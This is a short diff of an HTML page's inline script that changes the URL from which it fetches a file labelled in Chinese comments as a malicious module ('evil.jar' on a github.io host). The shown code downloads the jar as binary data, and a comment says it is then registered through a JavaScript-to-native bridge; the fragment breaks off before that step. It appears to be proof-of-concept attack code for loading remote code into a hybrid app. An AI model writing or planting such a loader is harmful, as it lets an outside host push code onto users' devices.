@@ -3,7 +3,7 @@
 <body>
 <script>
 // 通过WebSocket或HTTP下载恶意模块
-fetch('https://atompattern.github.io/EvilModule.jar')
+fetch('https://atompattern.github.io/evil.jar')
     .then(res => res.arrayBuffer())
     .then(data => {
         // 通过JS-Native Bridge触发模块注册
